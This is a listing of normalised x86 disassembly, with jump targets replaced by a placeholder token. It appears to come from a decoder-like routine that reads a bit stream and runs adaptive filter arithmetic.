jl r-xdata
mov edx [ ecx ]
add edx ebx
and edx 0x7
mov [ ecx + edx * 4 + 0x10 ] eax
add ecx 0x60
cmp [ esp + 0x2c ] 0x0
mov esi eax
jne r-xdata
test esi esi
je r-xdata
mov ebp [ ecx + 0x8 ]
mov edx [ ecx + ebx * 4 + 0x10 ]
sub [ esp + 0x2c ] 0x1
mov eax ebp
imul eax edx
add eax 0x100
sar eax 0x9
add eax esi
test edx edx
je r-xdata
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x74 ]
mov eax [ ecx ]
push 0x4
push ebp
push edx
call eax
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov eax [ edi + 0x48 ]
cmp eax 0x8
jge r-xdata
push 0x0
mov esi edi
call sub_406520
mov esi eax
cmp esi 0x80000000
je r-xdata
test eax eax
mov esi edi
je r-xdata
cmp eax [ esp + 0x38 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
neg ecx
cmp eax ecx
jge r-xdata
mov eax edx
sub eax ecx
mov [ esp + 0x70 ] eax
mov eax [ esp + 0x18 ]
lea ecx [ edx + eax * 2 ]
add ecx eax
cmp edx [ esp + 0x44 ]
mov [ esp + 0x6c ] edx
mov [ esp + 0x18 ] ecx
jge r-xdata
mov [ esp + 0x64 ] eax
mov [ esp + 0x64 ] eax
jmp r-xdata
mov edx [ edi + 0x80 ]
test edx edx
mov esi [ esp + 0x34 ]
lea ecx [ edi + 0x8cc ]
je r-xdata
cmp eax 0x80000000
je r-xdata
push 0x0
mov esi edi
call sub_406520
cmp eax 0x80000000
je r-xdata
jmp r-xdata
mov eax [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x10 ]
add eax 0x1
add ebp 0x4
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
xor edx edx
test ebp ebp
setg dl
xor ecx ecx
cmp [ esp + 0x78 ] ecx
setge cl
cmp ecx edx
mov ecx [ esp + 0x68 ]
mov edx ecx
jne r-xdata
mov [ esp + 0x64 ] ecx
mov [ esp + 0x64 ] ecx
jmp r-xdata
cmp [ esp + 0x3c ] edx
mov esi ecx
jg r-xdata
cmp eax [ esp + 0x3c ]
jg r-xdata
cmp esi ebp
jge r-xdata
cmp esi ebp
jge r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi + 0x48 ]
cmp eax 0x20
mov edx [ edi + 0x3c ]
jle r-xdata
jmp r-xdata
add [ edi + 0x30 ] esi
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0x48 ] eax
mov eax [ edi + 0x3c ]
jmp r-xdata
mov edx [ esp + 0x48 ]
jmp r-xdata
mov ebx 0x4
cmp [ edi + 0x48 ] ebx
jge r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
mov ebp [ ecx + 0x8 ]
mov edx [ ecx + ebx * 4 + 0x10 ]
sub [ esp + 0x2c ] 0x1
mov eax ebp
imul eax edx
add eax 0x80
sar eax 0x8
add eax esi
test edx edx
je r-xdata
jmp r-xdata
xor edx esi
jl r-xdata
mov edx [ ecx ]
add edx ebx
and edx 0x7
mov [ ecx + edx * 4 + 0x10 ] eax
add ecx 0x60
cmp [ esp + 0x2c ] 0x0
mov esi eax
jne r-xdata
test esi esi
je r-xdata
push ebp
call sub_40fdab
mov ebx [ esi + 0x60 ]
add esp 0x4
cmp ebx 0x10
jbe r-xdata
mov edi edi
mov eax [ edi + 0x2c ]
sub eax [ edi + 0x30 ]
mov edx [ esi + 0x60 ]
add edx eax
mov eax [ esi + 0x5c ]
push edx
push eax
call sub_41026d
mov [ esi + 0x5c ] eax
mov eax [ edi + 0x48 ]
add esp 0x8
cmp eax 0x8
jge r-xdata
add eax 0x8
add [ edi + 0x30 ] ebx
mov [ edi + 0x48 ] eax
mov ebp [ esp + 0x64 ]
mov eax [ esp + 0x70 ]
mov ecx ebp
imul ecx eax
add ecx 0x80
sar ecx 0x8
add ecx [ esp + 0x6c ]
xor edx edx
add ecx esi
test eax eax
setge dl
xor eax eax
test esi esi
setg al
cmp edx eax
jne r-xdata
push 0x0
call sub_406520
mov ebp eax
push 0x1
mov [ esp + 0x54 ] ebp
call sub_406520
lea ecx [ esp + 0x58 ]
push ecx
push 0x0
call sub_406a50
lea edx [ esp + 0x5c ]
push edx
mov ebp eax
push 0x1
mov [ esp + 0x58 ] ebp
call sub_406a50
jmp r-xdata
mov ecx [ esp + 0x30 ]
shl eax cl
cmp eax [ esp + 0x20 ]
jle r-xdata
mov edx [ esp + 0x3c ]
mov [ ebp ] edx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
cmp edx [ esp + 0x38 ]
jle r-xdata
mov eax [ esp + 0x20 ]
neg eax
cmp edx eax
jge r-xdata
mov ecx [ esp + 0x1c ]
add esi 0x1
and esi 0x7
test cl cl
mov [ esp + 0x34 ] esi
jns r-xdata
mov esi [ ecx + esi * 4 + 0x10 ]
mov ebx [ ecx + 0x8 ]
sub edx 0x1
mov [ esp + 0x2c ] edx
mov edx esi
sar edx 0x7
and edx 0xfffffe00
mov ebp esi
imul edx ebx
and ebp 0xffff
imul ebp ebx
sar ebp 0x7
lea edx [ edx + ebp + 0x1 ]
sar edx 0x1
add edx eax
test esi esi
je r-xdata
mov [ ebp ] eax
sub ecx 0x1
test edx edx
mov [ esp + 0x68 ] ecx
jne r-xdata
add ecx 0x1
cmp edx 0x100
mov [ esp + 0x68 ] ecx
jne r-xdata
lea ebp [ ecx + ebx ]
add ecx ebp
sub esi ebx
mov ebp ecx
add ecx esi
jmp r-xdata
mov edx ebx
add ecx ecx
and edx 0x1
or ecx edx
mov esi ecx
lea ebp [ ecx + ebx ]
sub esi ebx
sar ebp 0x1
sar esi 0x1
jmp r-xdata
cmp [ esp + 0x38 ] edx
jge r-xdata
cmp ecx [ esp + 0x40 ]
jge r-xdata
cmp [ esp + 0x38 ] ecx
jge r-xdata
cmp edx [ esp + 0x40 ]
jge r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x1c ]
add eax 0x1
and eax 0x7
test ecx 0x4000
mov [ esp + 0x34 ] eax
je r-xdata
mov edi edi
mov ecx [ eax ]
sub [ esp + 0x2c ] 0x1
test ecx ecx
jle r-xdata
add eax 0xfffffffc
shr [ edi + 0x3c ] 0x4
mov [ edi + 0x48 ] eax
mov ecx [ edi + 0x30 ]
add eax 0xfffffffc
mov [ edi + 0x48 ] eax
movzx esi [ ecx ]
mov ecx 0x8
sub cl al
shr esi cl
mov [ edi + 0x3c ] esi
mov esi 0x1
jmp r-xdata
add [ edi + 0x30 ] esi
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
mov edx [ edi + 0x30 ]
mov [ edi + 0x48 ] 0x7
movzx eax [ edx ]
mov [ edi + 0x3c ] eax
mov ecx [ edi + 0x24 ]
lea eax [ edi + 0x24 ]
push eax
call ecx
add esp 0x4
shr [ edi + 0x3c ] 0x1
and eax esi
test eax eax
je r-xdata
mov eax [ edi + 0x48 ]
cmp eax 0x20
mov edx [ edi + 0x3c ]
jle r-xdata
mov ebp 0x1
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0x48 ] eax
mov eax [ edi + 0x3c ]
jmp r-xdata
add ebx 0x1
and ebx 0x7
test [ esp + 0x1c ] 0x40
mov [ esp + 0x34 ] ebx
je r-xdata
cmp ebp [ esp + 0x28 ]
lea edx [ ebp - 0x1 ]
mov [ ecx + 0x8 ] edx
jne r-xdata
cmp ebp 0x100
lea edx [ ebp + 0x1 ]
mov [ ecx + 0x8 ] edx
jne r-xdata
jmp r-xdata
xor edx esi
jl r-xdata
mov edx [ esi + 0x5c ]
xor ebp ebp
xor ecx ecx
lea eax [ edx + 0x2 ]
mov ecx [ esi + 0x60 ]
mov edx [ esi + 0x5c ]
add ecx ebx
push ecx
push edx
call sub_41026d
mov ecx [ esi + 0x60 ]
push ebx
add ecx eax
push ebp
push ecx
mov [ esi + 0x5c ] eax
call sub_410ec0
add [ esi + 0x60 ] ebx
mov edx [ esi + 0x70 ]
mov eax [ esi + 0x74 ]
mov ecx [ edx ]
push 0x4
push ebp
push eax
call ecx
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
mov eax [ edi + 0x2c ]
mov ecx [ edi + 0x48 ]
sub eax [ edi + 0x30 ]
cmp ecx 0x8
jge r-xdata
add eax 0x8
add [ edi + 0x30 ] ebx
mov [ edi + 0x48 ] eax
mov eax ebp
sub ebp 0x1
test eax eax
mov [ esp + 0x64 ] ebp
jne r-xdata
mov edx ebp
add ebp 0x1
cmp edx 0x100
mov [ esp + 0x64 ] ebp
jne r-xdata
mov edx [ edi + 0x80 ]
test edx edx
lea ecx [ edi + 0x8cc ]
je r-xdata
cmp ebp 0x80000000
mov [ esp + 0x4c ] eax
je r-xdata
cmp eax [ esp + 0x38 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
neg ecx
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
push 0x1
add ebp 0x4
call sub_406520
mov ecx [ esp + 0x78 ]
add ecx eax
mov eax [ esp + 0x74 ]
add eax ecx
mov [ esp + 0x78 ] ecx
lea ecx [ eax + ebx * 2 ]
add ecx ebx
cmp eax [ esp + 0x44 ]
mov [ esp + 0x74 ] eax
mov [ esp + 0x18 ] ecx
jge r-xdata
mov ecx [ esp + 0x30 ]
shl edx cl
cmp edx [ esp + 0x20 ]
jle r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x14 ]
mov [ eax ] ecx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov ecx [ esp + 0x18 ]
lea edx [ eax + ecx * 2 ]
add edx ecx
cmp eax [ esp + 0x44 ]
mov [ esp + 0x18 ] edx
jge r-xdata
test ecx 0x100
je r-xdata
mov ebx [ ecx ]
mov esi [ esp + 0x34 ]
add ebx esi
and ebx 0x7
mov [ ecx + ebx * 4 + 0x10 ] edx
mov eax edx
mov edx [ esp + 0x2c ]
add ecx 0x60
test edx edx
jne r-xdata
test eax eax
je r-xdata
mov ebx [ esp + 0x6c ]
mov ebp [ esp + 0x74 ]
sub eax ebx
sub esi ebp
add ebx eax
add ebp esi
test [ esp + 0x1c ] 0x40
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] ebx
mov [ esp + 0x78 ] esi
mov [ esp + 0x74 ] ebp
je r-xdata
mov [ esp + 0x68 ] edx
mov [ esp + 0x68 ] edx
jmp r-xdata
mov ebp ebx
mov esi ecx
mov ebx ebp
sub ebx esi
lea ebp [ eax + ebx ]
mov esi eax
lea ecx [ eax + ebp ]
jmp r-xdata
lea ecx [ eax + eax ]
mov eax ebx
and eax 0x1
or ecx eax
mov esi ecx
lea ebp [ ecx + ebx ]
sub esi ebx
sar ebp 0x1
sar esi 0x1
jmp r-xdata
mov ebp ebx
lea ecx [ eax + ebx ]
mov esi eax
sub ebx eax
jmp r-xdata
mov esi eax
sub esi ebx
mov ebp eax
lea ecx [ eax + esi ]
jmp r-xdata
mov edx ebx
and edx 0x1
lea ecx [ eax + eax ]
or ecx edx
mov esi ecx
lea ebp [ ecx + ebx ]
sub esi ebx
sar ebp 0x1
sar esi 0x1
jmp r-xdata
lea ecx [ eax + ebx ]
mov ebp eax
sub eax ebx
mov esi ebx
mov ebx eax
jmp r-xdata
test cl 0x40
je r-xdata
mov edx ebp
and edx 0x1
lea eax [ esi + esi ]
or eax edx
mov edx eax
sub edx ebp
sar edx 0x1
add ebp eax
mov esi edx
sar ebp 0x1
mov ebx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
cmp ecx 0xffffffff
mov ecx ebx
jne r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ eax + ecx * 4 + 0x30 ]
mov ebx [ eax + ecx * 4 + 0x10 ]
mov [ esp + 0x4c ] edx
mov edx [ eax ]
add ecx edx
mov edx [ eax + 0xc ]
imul edx [ esp + 0x4c ]
and ecx 0x7
mov [ esp + 0x60 ] ecx
mov ecx [ eax + 0x8 ]
imul ecx ebx
add ecx 0x80
add edx 0x80
sar ecx 0x8
sar edx 0x8
add ecx ebp
add edx esi
test ebx ebx
je r-xdata
mov ebx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
cmp ecx 0xffffffff
mov ecx ebx
jne r-xdata
mov ecx [ esp + 0x34 ]
mov edx [ eax + ecx * 4 + 0x30 ]
mov ebx [ eax + ecx * 4 + 0x10 ]
mov [ esp + 0x4c ] edx
mov edx [ eax ]
add ecx edx
mov edx [ eax + 0xc ]
imul edx [ esp + 0x4c ]
and ecx 0x7
mov [ esp + 0x58 ] ecx
mov ecx [ eax + 0x8 ]
imul ecx ebx
add ecx 0x100
add edx 0x100
sar ecx 0x9
sar edx 0x9
add ecx ebp
add edx esi
test ebx ebx
je r-xdata
add [ edi + 0x8a0 ] esi
mov [ edi + 0x89c ] edx
mov [ edi + 0x8a0 ] 0x0
jmp r-xdata
and edx 0xf
cmp edx [ edi + 0x89c ]
je r-xdata
mov edx [ edi + 0x30 ]
movzx eax [ edx ]
mov ecx [ edi + 0x48 ]
shl eax cl
add ecx 0x8
mov [ edi + 0x48 ] ecx
or [ edi + 0x3c ] eax
cmp ecx ebp
jl r-xdata
lea eax [ edi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
mov ebp 0x4
jmp r-xdata
add eax 0xfffffffc
shr [ edi + 0x3c ] 0x4
mov [ edi + 0x48 ] eax
mov ecx [ edi + 0x30 ]
add eax 0xfffffffc
mov [ edi + 0x48 ] eax
movzx ebp [ ecx ]
mov ecx 0x8
sub cl al
shr ebp cl
mov [ edi + 0x3c ] ebp
jmp r-xdata
mov eax [ edi + 0x30 ]
movzx edx [ eax ]
mov ecx [ edi + 0x48 ]
shl edx cl
add ecx 0x8
mov [ edi + 0x48 ] ecx
or [ edi + 0x3c ] edx
cmp ecx ebx
jl r-xdata
mov edx [ edi + 0x24 ]
lea eax [ edi + 0x24 ]
push eax
call edx
add esp 0x4
mov ecx [ edi + 0x30 ]
mov [ edi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ edi + 0x3c ] eax
lea eax [ edi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ edi + 0x3c ] 0x1
and eax 0x1
test eax eax
je r-xdata
add edx 0x1
add edx 0xffffffff
jmp r-xdata
cmp ebp [ esp + 0x28 ]
lea edx [ ebp - 0x1 ]
mov [ ecx + 0x8 ] edx
jne r-xdata
cmp ebp 0x200
lea edx [ ebp + 0x1 ]
mov [ ecx + 0x8 ] edx
jne r-xdata
cmp ecx 0x10
jne r-xdata
cmp [ eax - 0x1 ] 0xff
jne r-xdata
mov edx [ esi + 0x60 ]
mov ecx [ edi + 0x30 ]
add edx [ esi + 0x5c ]
push eax
push ecx
push edx
call sub_410ec0
mov eax [ edi + 0x48 ]
add esp 0xc
cmp eax 0x8
jge r-xdata
add ecx 0x8
add [ edi + 0x30 ] ebx
mov [ edi + 0x48 ] ecx
mov eax ecx
sub eax [ esp + 0x6c ]
mov ebx ecx
mov [ esp + 0x70 ] eax
mov eax [ esp + 0x18 ]
lea ebp [ ecx + eax * 2 ]
push 0x1
mov esi edi
mov [ esp + 0x70 ] ebx
add ebp eax
call sub_406520
mov edx [ esp + 0x68 ]
mov esi eax
mov eax [ esp + 0x78 ]
imul edx eax
add edx 0x80
sar edx 0x8
add edx [ esp + 0x74 ]
xor ecx ecx
add edx esi
test eax eax
setge cl
xor eax eax
test esi esi
setg al
cmp ecx eax
mov eax [ esp + 0x68 ]
mov ecx eax
jne r-xdata
mov [ esp + 0x64 ] eax
mov [ esp + 0x64 ] edx
jmp r-xdata
mov ecx [ esp + 0x34 ]
add ecx 0x1
and ecx 0x7
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x1c ]
mov esi ecx
and esi 0x80
mov [ esp + 0x60 ] esi
je r-xdata
lea esp [ esp ]
mov ecx [ esp + 0x30 ]
shl eax cl
cmp eax [ esp + 0x20 ]
jle r-xdata
mov edx [ esp + 0x3c ]
mov [ ebp ] edx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov [ ebp ] eax
jmp r-xdata
mov edx [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
add eax 0x4
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
cmp eax [ esp + 0x38 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
neg ecx
cmp eax ecx
jge r-xdata
mov ecx [ esp + 0x18 ]
add eax ebx
lea edx [ eax + ecx * 2 ]
add edx ecx
mov ecx [ edi + 0x8a8 ]
add ecx ebx
add eax ecx
mov ecx [ esp + 0x18 ]
lea edx [ eax + ecx * 2 ]
add edx ecx
mov ecx ebx
neg ecx
mov [ edi + 0x8a8 ] ecx
jmp r-xdata
mov ebx [ esp + 0x58 ]
mov ebp [ esp + 0x14 ]
xor esi eax
jl r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ ebx + ecx * 2 ]
add eax ecx
mov ecx [ esp + 0x30 ]
lea edx [ ebp + eax * 2 ]
add edx eax
mov eax [ esp + 0x14 ]
shl ebx cl
shl ebp cl
add eax 0x4
add eax 0x4
mov [ eax - 0x8 ] ebx
mov [ eax - 0x4 ] ebp
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] eax
mov esi 0x8
cmp [ edi + 0x8a0 ] esi
jl r-xdata
sar ecx 0x1
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edx [ esp + 0x38 ]
sar edx 0x8
sub eax edx
add [ esp + 0x38 ] eax
mov eax ebp
cdq
xor eax edx
sub eax edx
mov edx [ esp + 0x3c ]
sar edx 0x8
sub eax edx
add [ esp + 0x3c ] eax
mov eax esi
cdq
xor eax edx
sub eax edx
mov edx [ esp + 0x44 ]
sar edx 0x8
sub eax edx
add [ esp + 0x44 ] eax
mov eax ebx
cdq
xor eax edx
sub eax edx
mov edx [ esp + 0x40 ]
sar edx 0x8
sub eax edx
add [ esp + 0x40 ] eax
test [ esp + 0x1c ] 0x4000
je r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ ebp + ecx * 2 ]
add eax ecx
mov ecx [ esp + 0x30 ]
lea edx [ esi + eax * 2 ]
add edx eax
mov eax [ esp + 0x14 ]
shl ebp cl
shl esi cl
add eax 0x4
add eax 0x4
mov [ eax - 0x8 ] ebp
mov [ eax - 0x4 ] esi
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] eax
mov ebx 0x8
cmp [ edi + 0x8a0 ] ebx
jl r-xdata
imul ecx edx
add ecx 0x80
sar ecx 0x8
add ecx esi
test ebx ebx
je r-xdata
imul ecx edx
add ecx 0x80
sar ecx 0x8
add ecx ebp
test ebx ebx
je r-xdata
mov ebx [ esp + 0x4c ]
test ebx ebx
je r-xdata
test ebp ebp
je r-xdata
imul ecx edx
add ecx 0x100
sar ecx 0x9
add ecx esi
test ebx ebx
je r-xdata
imul ecx edx
add ecx 0x100
sar ecx 0x9
add ecx ebp
test ebx ebx
je r-xdata
mov ebx [ esp + 0x4c ]
test ebx ebx
je r-xdata
test ebp ebp
je r-xdata
mov eax [ esp + 0x10 ]
add eax esi
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
mov eax ebx
shl eax 0x4
add eax [ edi + 0x89c ]
mov [ edx ] eax
lea eax [ eax + ecx * 2 ]
add eax ecx
add edx ebp
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
jmp r-xdata
add [ edi + 0x8a0 ] 0x1
mov [ edi + 0x89c ] edx
mov [ edi + 0x8a0 ] 0x0
jmp r-xdata
and edx 0xf
cmp edx [ edi + 0x89c ]
je r-xdata
add [ edi + 0x30 ] ebp
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
mov ebx 0x4
jmp r-xdata
mov [ ecx + 0x8 ] edx
add edx 0x1
add edx 0xffffffff
jmp r-xdata
push edx
call sub_40fdab
add esp 0x4
mov [ esi + 0x5c ] ebp
mov [ esi + 0x60 ] ebp
add ebx 0xfffffff0
push ebx
lea eax [ edx + 0x10 ]
push eax
push edx
call sub_410ec0
add esp 0xc
add [ esi + 0x60 ] 0xfffffff0
jmp r-xdata
add ecx 0x1
jmp r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov eax [ edi + 0x2c ]
sub eax [ edi + 0x30 ]
add [ esi + 0x60 ] eax
add eax 0x8
add [ edi + 0x30 ] ebx
mov [ edi + 0x48 ] eax
sub eax 0x1
test ecx ecx
mov [ esp + 0x68 ] eax
jne r-xdata
add eax 0x1
cmp ecx 0x100
mov [ esp + 0x68 ] eax
jne r-xdata
test ecx 0x4000
je r-xdata
test ecx 0x100
je r-xdata
mov esi [ esp + 0x60 ]
mov eax esi
sar eax 0x7
and eax 0xfffffe00
mov ebx esi
and ebx 0xffff
mov [ esp + 0x50 ] edx
mov [ ecx + ebp * 4 + 0x10 ] edx
mov edx [ ecx + 0xc ]
imul ebx edx
imul eax edx
sar ebx 0x7
lea eax [ eax + ebx + 0x1 ]
mov ebx [ esp + 0x4c ]
sar eax 0x1
add eax ebx
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push 0x0
mov esi edi
call sub_406520
cmp eax 0x80000000
je r-xdata
jmp r-xdata
mov eax [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x10 ]
add eax 0x1
add ebp 0x4
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov [ eax ] edx
mov ecx [ esp + 0x30 ]
shl eax cl
cmp eax [ esp + 0x20 ]
jle r-xdata
mov edx [ esp + 0x3c ]
mov [ ebp ] edx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov edx [ esp + 0x48 ]
jmp r-xdata
mov [ esp + 0x18 ] edx
cmp ebx [ esp + 0x28 ]
lea eax [ ebx - 0x1 ]
mov [ ecx + 0x8 ] eax
jne r-xdata
cmp ebx 0x100
lea eax [ ebx + 0x1 ]
mov [ ecx + 0x8 ] eax
jne r-xdata
jmp r-xdata
cmp [ edi + 0x48 ] esi
jge r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esp + 0x54 ]
jmp r-xdata
cmp [ edi + 0x48 ] ebx
jge r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
mov ebx [ eax + 0xc ]
mov edx ebx
imul edx ecx
add edx 0x80
sar edx 0x8
add edx ebp
test ecx ecx
mov esi ecx
je r-xdata
test esi esi
je r-xdata
mov ebx [ eax + 0xc ]
mov edx ebx
imul edx ecx
add edx 0x80
sar edx 0x8
add edx esi
test ecx ecx
mov ebp ecx
je r-xdata
test ebp ebp
je r-xdata
mov ebx [ esp + 0x60 ]
mov ebp ecx
mov [ eax + ebx * 4 + 0x10 ] ecx
mov esi edx
mov [ eax + ebx * 4 + 0x30 ] edx
jmp r-xdata
test esi esi
je r-xdata
xor ebx ebp
mov ebp [ eax + 0x8 ]
jl r-xdata
mov ebx [ eax + 0xc ]
mov edx ebx
imul edx ecx
add edx 0x100
sar edx 0x9
add edx ebp
test ecx ecx
mov esi ecx
je r-xdata
test esi esi
je r-xdata
mov ebx [ eax + 0xc ]
mov edx ebx
imul edx ecx
add edx 0x100
sar edx 0x9
add edx esi
test ecx ecx
mov ebp ecx
je r-xdata
test ebp ebp
je r-xdata
mov ebx [ esp + 0x58 ]
mov ebp ecx
mov [ eax + ebx * 4 + 0x10 ] ecx
mov esi edx
mov [ eax + ebx * 4 + 0x30 ] edx
jmp r-xdata
test esi esi
je r-xdata
xor ebx ebp
mov ebp [ eax + 0x8 ]
jl r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x18 ]
shl esi 0x4
add esi [ edi + 0x89c ]
lea edx [ esi + eax * 2 ]
add edx eax
mov eax [ esp + 0x14 ]
mov [ eax ] esi
mov [ esp + 0x18 ] edx
add eax ebx
jmp r-xdata
mov [ ecx + 0x8 ] edx
add ecx 0x2
jmp r-xdata
cmp [ eax + 0x1 ] 0xff
jne r-xdata
mov esi [ esp + 0x44 ]
mov eax edx
sub eax [ esp + 0x74 ]
mov [ esp + 0x74 ] edx
mov [ esp + 0x78 ] eax
lea eax [ edx + ebp * 2 ]
add eax ebp
cmp ebx esi
mov [ esp + 0x18 ] eax
jge r-xdata
mov [ esp + 0x68 ] ecx
mov [ esp + 0x68 ] ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ ebp + edx * 2 ]
add ecx edx
lea edx [ eax + ecx * 2 ]
add edx ecx
test esi esi
mov [ esp + 0x18 ] edx
je r-xdata
mov edx ebp
lea ecx [ eax + eax ]
and edx 0x1
or ecx edx
mov eax ecx
sub eax ebp
add ebp ecx
sar eax 0x1
sar ebp 0x1
add ebp [ esp + 0x58 ]
add eax [ esp + 0x5c ]
mov ecx [ edi + 0x8a8 ]
mov edx [ esp + 0x58 ]
mov esi [ edi + 0x8ac ]
add ecx edx
add ebp ecx
mov ecx [ esp + 0x5c ]
add esi ecx
add eax esi
mov esi [ esp + 0x60 ]
neg edx
neg ecx
mov [ edi + 0x8ac ] ecx
mov ecx [ esp + 0x1c ]
mov [ edi + 0x8a8 ] edx
jmp r-xdata
mov edx [ esp + 0x2c ]
mov [ ecx + ebp * 4 + 0x30 ] eax
add ecx 0x60
test edx edx
mov [ esp + 0x4c ] eax
jne r-xdata
test ebx ebx
je r-xdata
xor esi ebx
jl r-xdata
mov [ ebp ] eax
mov eax [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x10 ]
add eax 0x1
add ebp 0x4
cmp eax [ esp + 0x88 ]
mov [ esp + 0x14 ] ebp
mov [ esp + 0x10 ] eax
jb r-xdata
add eax 0x1
add eax 0xffffffff
jmp r-xdata
mov eax [ edi + 0x48 ]
cmp eax 0x20
mov edx [ edi + 0x3c ]
jle r-xdata
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0x48 ] eax
mov eax [ edi + 0x3c ]
jmp r-xdata
mov eax [ edi + 0x48 ]
cmp eax 0x20
mov edx [ edi + 0x3c ]
jle r-xdata
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
add [ edi + 0x30 ] 0x1
mov eax [ edi + 0x30 ]
cmp eax [ edi + 0x2c ]
jne r-xdata
add eax 0xffffffff
mov [ edi + 0x48 ] eax
mov eax [ edi + 0x3c ]
jmp r-xdata
mov ebp edx
test ebp ebp
je r-xdata
xor ebx esi
jl r-xdata
mov esi edx
jmp r-xdata
test esi esi
je r-xdata
xor ebx ebp
jl r-xdata
add eax 0x60
cmp [ esp + 0x2c ] 0x0
jne r-xdata
xor ebx esi
mov ebx [ eax + 0xc ]
jl r-xdata
cmp ebp [ esp + 0x28 ]
lea ebx [ ebp - 0x1 ]
mov [ esp + 0x58 ] ebx
mov [ eax + 0x8 ] ebx
jne r-xdata
cmp ebp 0x100
lea ebx [ ebp + 0x1 ]
mov [ eax + 0x8 ] ebx
jne r-xdata
mov ebp edx
test ebp ebp
je r-xdata
xor ebx esi
jl r-xdata
mov esi edx
jmp r-xdata
test esi esi
je r-xdata
xor ebx ebp
jl r-xdata
add eax 0x60
cmp [ esp + 0x2c ] 0x0
jne r-xdata
xor ebx esi
mov ebx [ eax + 0xc ]
jl r-xdata
cmp ebp [ esp + 0x28 ]
lea ebx [ ebp - 0x1 ]
mov [ esp + 0x50 ] ebx
mov [ eax + 0x8 ] ebx
jne r-xdata
cmp ebp 0x200
lea ebx [ ebp + 0x1 ]
mov [ eax + 0x8 ] ebx
jne r-xdata
add ecx 0x3
add ecx 0x4
add eax 0x4
cmp ecx 0x10
jl r-xdata
cmp ebx [ esp + 0x38 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
mov eax ecx
neg eax
cmp ebx eax
jge r-xdata
mov edx [ esp + 0x44 ]
cmp ebp edx
jge r-xdata
mov ecx [ esp + 0x30 ]
shl ebp cl
add ebx 0x4
mov [ ebx - 0x4 ] ebp
jmp r-xdata
mov eax [ esp + 0x34 ]
mov esi [ ecx + eax * 4 + 0x10 ]
mov ebp [ ecx ]
sub edx 0x1
mov [ esp + 0x2c ] edx
mov edx [ ecx + eax * 4 + 0x30 ]
mov [ esp + 0x60 ] edx
add ebp eax
mov eax [ ecx + 0x8 ]
mov edx esi
sar edx 0x7
and edx 0xfffffe00
mov ebx esi
imul edx eax
and ebx 0xffff
imul ebx eax
sar ebx 0x7
lea edx [ edx + ebx + 0x1 ]
mov ebx [ esp + 0x50 ]
sar edx 0x1
and ebp 0x7
add edx ebx
test esi esi
je r-xdata
mov ebx [ esp + 0x14 ]
mov ebp [ esp + 0x50 ]
xor esi ebx
jl r-xdata
cmp eax [ esp + 0x28 ]
lea esi [ eax - 0x1 ]
mov [ ecx + 0x8 ] esi
